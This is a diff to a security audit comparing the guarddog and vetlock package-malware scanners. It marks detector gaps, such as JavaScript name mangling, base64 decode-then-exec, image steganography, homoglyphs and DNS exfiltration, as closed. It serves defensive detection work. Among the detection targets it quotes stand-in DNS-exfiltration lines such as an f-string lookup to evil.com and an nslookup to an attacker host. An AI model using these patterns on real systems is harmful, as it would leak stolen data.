@@ -1,6 +1,6 @@
 # guarddog vs vetlock — comparative audit
 
-**Status:** landed by Wave 7-GG.
+**Status:** landed by Wave 7-GG. **Closure markers** (`**CLOSED (Wave 8-XX, SHA <TBD>):**`) below are stamped by the wave that ports the corresponding detector or architectural insight; SHAs are back-filled when Wave 8-KK / 8-LL / 8-MM merge into `main`. Until then, the SHA placeholder is `<TBD>` and integration status is tracked in `ROADMAP.md` under the Wave 8 section.
 **guarddog source read:** `github.com/DataDog/guarddog@main` (shallow clone, 2026-07-15).
 **vetlock source read:** this worktree, `origin/main` at start of Wave 7-GG.
 **Companion adapter:** `assurance/src/differential/guarddog.ts` (differential ledger participant).
@@ -35,28 +35,28 @@ Each entry cites the guarddog rule file (path relative to their repo root), stat
 
 ### 1.1 Obfuscation
 
-#### G-01. JavaScript variable-name mangling (`_0x[hex]{4,6}` pattern)
+#### G-01. **CLOSED (Wave 8-KK, SHA <TBD>):** JavaScript variable-name mangling (`_0x[hex]{4,6}` pattern)
 
 - **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-js-mangling.yar` (`identifies=threat.runtime.obfuscation.js.mangling`, severity=medium).
 - **What it catches:** the tell-tale `_0x1a2b3c` variable naming that `javascript-obfuscator`, `obfuscator.io`, and other commercial JS obfuscators emit — plus the UTF-16LE encoded variant that npm's own scanning historically missed.
 - **vetlock today:** `packages/detectors/src/obf.ts` fires on entropy jump + suspicious literal density but does not specifically look for the `_0x` mangling signature. A tarball newly shipping `_0x`-mangled files that stay under the entropy threshold (e.g. only the top of a large file is mangled) would slip.
 - **Classification:** **REAL GAP.** Add `obf.js-mangler-signature` as a diff-mode detector: scan every added/modified `.js|.mjs|.cjs|.ts` in `pair.new` for ≥3 distinct `_0x[a-f0-9]{4,6}\b` identifiers. First-version-cluster mode: fire on any first-published file that contains ≥3. Cheap regex, high precision — Datadog's own eval samples show near-zero false positives on legit code.
 
-#### G-02. Base64-decode-then-exec pair, cross-language
+#### G-02. **CLOSED (Wave 8-LL, SHA <TBD>):** Base64-decode-then-exec pair, cross-language
 
 - **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-base64exec.yar` (severity=high).
 - **What it catches:** the paired shape `base64.b64decode(...)` + `exec(` / `eval(` (Python), `atob(...)` + `eval()` (JS), `Buffer.from(x, 'base64')` + `new Function(...)`. The pair — not either alone — is what fires.
 - **vetlock today:** `net-encoded.ts` catches base64-encoded URL literals; `code.ts` fires on `new Function` and dynamic `eval`; but the **co-occurrence-in-same-file** signal that guarddog uses is not stitched together as one detector. It falls out of vetlock's compound-suspicion escalator only if both `obf` and `code` fire on different lines in different files — the tightly-paired same-file case has no single named signal.
 - **Classification:** **PARTIAL.** vetlock catches it indirectly through compound suspicion; guarddog packages it as a single high-severity rule with defanged file-path evidence. Adding `obf.base64-then-exec` as a per-file same-scope pair detector would tighten evidence quality.
 
-#### G-03. Steganography — decode-then-exec after image/data-URL
+#### G-03. **CLOSED (Wave 8-LL, SHA <TBD>):** Steganography — decode-then-exec after image/data-URL
 
 - **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-steganography.yar` (severity=high).
 - **What it catches:** payload hidden inside an image (`.png`, `.jpg`, `.bmp`) or `data:` URL, followed by a decoder call feeding into `exec`/`eval`. Real-world example: the March 2024 `pytoileur`/`typosquat` waves.
 - **vetlock today:** no detector for image-shipped payload. Bundled binary detector (`bundled.ts`) flags standalone `.node`/`.so`/`.dll` files but not decoder-consumed image data.
 - **Classification:** **REAL GAP** (small class, but genuine). npm packages have shipped this shape too. Cheap to add: `obf.image-decode-exec` — file added to `pair.new` under a suspicious extension (`.png/.jpg/.webp/.gif`) that is `require()`d or `readFileSync`d in an added `.js` file whose immediate downstream is `atob`/`Buffer.from` piped to `eval`/`new Function`.
 
-#### G-04. Unicode homoglyph obfuscation
+#### G-04. **CLOSED (Wave 8-KK, SHA <TBD>):** Unicode homoglyph obfuscation
 
 - **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-unicode.yar` (severity=medium).
 - **What it catches:** Cyrillic/Greek letters adjacent to ASCII inside identifiers or strings (e.g. `pаypal` with a Cyrillic `а`), or zero-width chars wedged between ASCII letters as an invisible-splitter obfuscation.
@@ -65,7 +65,7 @@ Each entry cites the guarddog rule file (path relative to their repo root), stat
 
 ### 1.2 Network / exfiltration
 
-#### G-05. DNS-based exfiltration via constructed hostnames
+#### G-05. **CLOSED (Wave 8-LL, SHA <TBD>):** DNS-based exfiltration via constructed hostnames
 
 - **guarddog rule:** `guarddog/analyzer/sourcecode/threat-network-dns-exfil.yar` (severity=high, MITRE=exfiltration).
 - **What it catches:** `socket.getaddrinfo(f"{data}.evil.com")` (f-string interpolation) or `nslookup ${VAR}.attacker` — encoding stolen data into DNS query subdomains to bypass HTTP egress filters. This is the shape used by dependency-confusion probes (Burp Collaborator, oastify, `interact.sh`, canarytokens, dnslog).
@@ -141,7 +141,7 @@ Each entry cites the guarddog rule file (path relative to their repo root), stat
 
 ### 1.5 Package metadata
 
-#### G-15. Deceptive-author heuristic (disposable email domain)
+#### G-15. **CLOSED (Wave 8-KK, SHA <TBD>):** Deceptive-author heuristic (disposable email domain)
 
 - **guarddog rule:** `guarddog/analyzer/metadata/deceptive_author.py` (severity=medium, MITRE=initial-access).
 - **What it catches:** author email domain is on a known disposable-mail list (`mailinator.com`, `guerrillamail.com`, `10minutemail.com`, and ~200 more).
@@ -178,7 +178,7 @@ Each entry cites the guarddog rule file (path relative to their repo root), stat
 
 ### 1.6 Typosquatting
 
-#### G-20. Levenshtein + swap + hyphen-permutation against Top-5000
+#### G-20. **CLOSED (Wave 8-KK, SHA <TBD>):** Levenshtein + swap + hyphen-permutation against Top-5000
 
 - **guarddog rule:** `guarddog/analyzer/metadata/typosquatting.py` (severity=high).
 - **What it catches:** four flavors — Levenshtein-1, single-character transposition, hyphen-permutation (e.g. `foo-bar` vs `bar-foo`), and confused-form (e.g. `re-quests` vs `requests`).
@@ -189,7 +189,7 @@ Each entry cites the guarddog rule file (path relative to their repo root), stat
 
 ## §2 Architectural insights vetlock can absorb
 
-### 2.1 Explicit MITRE ATT&CK tactic on every finding
+### 2.1 **CLOSED (Wave 8-MM, SHA <TBD>):** Explicit MITRE ATT&CK tactic on every finding
 
 **guarddog does this:** every rule declares `mitre_tactics = "..."` (initial-access / execution / persistence / defense-evasion / credential-access / discovery / lateral-movement / collection / command-and-control / exfiltration / impact). Findings render grouped by attack STAGE (Initial execution / Post-compromise / Exfiltration).
 
@@ -197,7 +197,7 @@ Each entry cites the guarddog rule file (path relative to their repo root), stat
 
 **Recommendation:** add an optional `mitreTactics: readonly string[]` field on `Finding` and populate it in each detector. Report layer maps MITRE tactic → analyst-friendly stage label. Downstream: SIEM integrations (Datadog, Splunk, Sentinel) all speak MITRE natively.
 
-### 2.2 Risk score compression (0–10) with a documented weighting
+### 2.2 **CLOSED (Wave 8-MM, SHA <TBD>):** Risk score compression (0–10) with a documented weighting
 
 **guarddog does this:** four-factor scoring (severity 30% + attack-chain-completeness 20% + specificity 30% + sophistication 20%). Score bands: 0 / 0.1–3 / 3.1–7.5 / 7.6–10 with a plain-English label. Every rule declares its own `specificity` and `sophistication` (low/medium/high) so the numbers are traceable.
 
@@ -221,7 +221,7 @@ Each entry cites the guarddog rule file (path relative to their repo root), stat
 
 **Recommendation:** document the current threat model explicitly in `SECURITY.md` (already exists), and if any tarball-scanning entry point is added, adopt a Landlock/Seatbelt-style sandbox before shipping it. Consider gating the extraction path behind a `--allow-extract` flag with a warning today, to avoid a stealth expansion of the trust surface.
 
-### 2.5 SARIF output as a first-class format
+### 2.5 **CLOSED (Wave 8-MM, SHA <TBD>):** SARIF output as a first-class format
 
 **guarddog does this:** SARIF is a supported `--output-format` and the guarddog GitHub Action uploads SARIF to GitHub Code Scanning by default. Users get PR comments and false-positive management for free.
 
